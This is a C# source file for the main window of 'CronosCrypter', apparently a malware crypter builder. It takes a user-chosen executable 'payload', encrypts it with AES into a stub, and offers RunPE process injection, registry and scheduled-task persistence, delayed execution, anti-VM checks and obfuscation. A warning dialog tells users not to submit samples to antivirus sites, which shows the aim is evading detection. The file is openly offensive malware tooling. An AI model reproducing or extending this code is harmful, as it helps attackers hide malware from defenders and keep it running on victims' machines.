using CronosCrypter.Core;
using CronosCrypter.Obfuscator;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CronosCrypter
{
    public partial class MainFrm : Form
    {
        // Needed for moving window
        bool mouseDown;
        private Point offset;

        // Settings
        private Settings settings;

        public MainFrm()
        {
            InitializeComponent();
            SetupFoldername();
            runpeTypeBox.Text = "RegAsm";
            encryptionTypeBox.Text = "AES";
        }

        #region Panels
        /// <summary>
        /// This region is responsible for moving panel and window
        /// </summary>

        private void topPanel_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }

        private void topPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown == true)
            {
                Point currentScreenPos = PointToScreen(e.Location);
                Location = new Point(currentScreenPos.X - offset.X, currentScreenPos.Y - offset.Y);
            }

        }

        private void topPanel_MouseDown(object sender, MouseEventArgs e)
        {
            offset.X = e.X;
            offset.Y = e.Y;
            mouseDown = true;
        }
        #endregion

        #region Buttons

        /// <summary>
        /// In this region there is a code that is responsible for:
        ///  - Exit and Minimize button
        ///  - Browse payload, which as the name suggests, chooses payload
        ///  - Assembly button, which changes assembly of built file
        ///  - Build button, which builds our payload
        /// </summary>

        // Exit application
        private void exitBox_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        // Minimize window
        private void minimizeBox_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        // Browse payload
        private void browsePayloadBtn_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable (*.exe)|*.exe";
                if(ofd.ShowDialog() == DialogResult.OK)
                {
                    payloadTxt.Text = ofd.FileName;
                    buildBtn.Enabled = true;
                }
                else
                {
                    buildBtn.Enabled = false;
                }
            }
        }
        // Build payload 
        private void buildBtn_Click(object sender, EventArgs e)
        {            
            using (SaveFileDialog selectSaveDialog = new SaveFileDialog())
            {
                selectSaveDialog.Filter = "Executable files|*.exe";
                bool flag = selectSaveDialog.ShowDialog() == DialogResult.OK;

                if (flag)
                {
                    bool flag1 = MessageBox.Show("By using this program, you take all responsibility for it! Please do not drop sample files on antivirus sites, and disable sample sending!", "Cronos - Crypter", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes;
                    if (flag1)
                    {
                        MessageBox.Show("User did not accept regulations!", "Cronos - Crypter");
                        Environment.Exit(0);
                    }
                    string Source = Properties.Resources.Stub;
                    Console.WriteLine("Started encrypting " + selectSaveDialog.FileName);

                    if (regeditChk.CheckState == CheckState.Checked)
                    {
                        settings.doInstall = true;
                        settings.doRegedit = true;
                    }
                    if (schtasksChk.CheckState == CheckState.Checked)
                    {
                        settings.doInstall = true;
                        settings.doSchtasks = true;
                    }
                    if(sleepChk.CheckState == CheckState.Checked)
                    {
                        settings.doSleep = true;
                    }
                    if (antiVM.CheckState == CheckState.Checked)
                    {
                        settings.doAntiVM = true;
                    }
                    settings.buildDirectory = selectSaveDialog.FileName;
                                      
                    this.Build();

                    CallObfuscator(selectSaveDialog);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    //File.Delete(selectSaveDialog.FileName);
                    

                }
            }
        }

        // Change assembly of a file
        private void assemblyBtn_Click(object sender, EventArgs e)
        {

        }
        #endregion

        #region Code

        /// <summary>
        /// This region contains the code, mostly needed for the UI but also stuff like obfuscate
        /// </summary>

        // Main function for building a file
        private bool Build()
        {
            settings.payloadName = payloadTxt.Text;
            settings.decryptKey = Path.GetRandomFileName().Replace(".", "");
            settings.stubResources = Path.GetRandomFileName().Replace(".", "");
            settings.injectionName = runpeTypeBox.Text;

            // Convert string to enum
            EncryptionType encType = (EncryptionType)Enum.Parse(typeof(EncryptionType), encryptionTypeBox.Text);
            settings.encryptionType = encType;


            // Autostart
            settings.fileName = filenameTxt.Text;
            settings.folderName = foldernameTxt.Text;
            settings.specialDir = specialBox.Text;
            settings.regeditName = regeditNameTxt.Text;
            settings.schtasksName = schtasksNameTxt.Text;

            // Settings
            settings.sleep = (int)sleepNum.Value;

            object bld = null;
            var thread = new Thread(() =>
            {
                bld = new Builder.Builder(settings).Build();
            });
            thread.Start();
            thread.Join();
            thread.Abort();
            return Convert.ToBoolean(bld);
        }

        // Fills special directory combobox with special folders name
        private void SetupFoldername()
        {
            const string ApplicationDataFolder = "ApplicationData";
            foreach (var typeSpecialFolder in Enum.GetValues(typeof(Environment.SpecialFolder)))
            {
                specialBox.Items.Add(typeSpecialFolder);
                if (typeSpecialFolder.ToString() == ApplicationDataFolder)
                {
                    specialBox.Text = ApplicationDataFolder;
                }
            }
        }
        
        // This function calls obfuscator, and obfuscates a file
        private void CallObfuscator(SaveFileDialog selectSaveDialog)
        {
            Obfuscate obf = new Obfuscate();
            string savingLocation = Path.GetDirectoryName(selectSaveDialog.FileName);
            string fileName = Path.GetFileNameWithoutExtension(Path.GetFileNameWithoutExtension(selectSaveDialog.FileName));

            ModuleDefMD module = ModuleDefMD.Load(Path.GetFullPath(selectSaveDialog.FileName));
            obf.Execute(module);

            Console.WriteLine("Saving file...");
            var opts = new ModuleWriterOptions(module);
            opts.Logger = DummyLogger.NoThrowInstance;

            string file = savingLocation + @"\" + fileName + "_protected" + ".exe";
            module.Write(file, opts);

        }

        // Enables/Disables textboxes, comboboxes etc. for schtasks
        private void schtasksBox_CheckedChanged(object sender, EventArgs e)
        {
            if (schtasksChk.Checked)
            {
                filenameTxt.Enabled = true;
                foldernameTxt.Enabled = true;
                specialBox.Enabled = true;
                schtasksNameTxt.Enabled = true;
            }
            else
            {
                schtasksNameTxt.Enabled = false;
            }

            if (schtasksChk.CheckState == CheckState.Unchecked)
            {
                schtasksNameTxt.Enabled = false;
                filenameTxt.Enabled = false;
                foldernameTxt.Enabled = false;
                specialBox.Enabled = false;
                regeditNameTxt.Enabled = false;
            }
        }

        // Enables/Disables textboxes, comboboxes etc. for regedit
        private void regeditChk_CheckedChanged(object sender, EventArgs e)
        {
            if (regeditChk.CheckState == CheckState.Checked)
            {
                filenameTxt.Enabled = true;
                foldernameTxt.Enabled = true;
                specialBox.Enabled = true;
                regeditNameTxt.Enabled = true;
            }
            else
            {
                regeditNameTxt.Enabled = false;
            }

            if (regeditChk.CheckState == CheckState.Unchecked)
            {
                regeditNameTxt.Enabled = false;
                filenameTxt.Enabled = false;
                foldernameTxt.Enabled = false;
                specialBox.Enabled = false;
                regeditNameTxt.Enabled = false;
            }
        }

        // Enables/Disables numericupsidedown for execution delay
        private void sleepChk_CheckedChanged(object sender, EventArgs e)
        {
            if(sleepChk.CheckState == CheckState.Checked)
            {
                sleepNum.Enabled = true;
            }
            else
            {
                sleepNum.Enabled = false;
            }
        }
        #endregion
    }
}
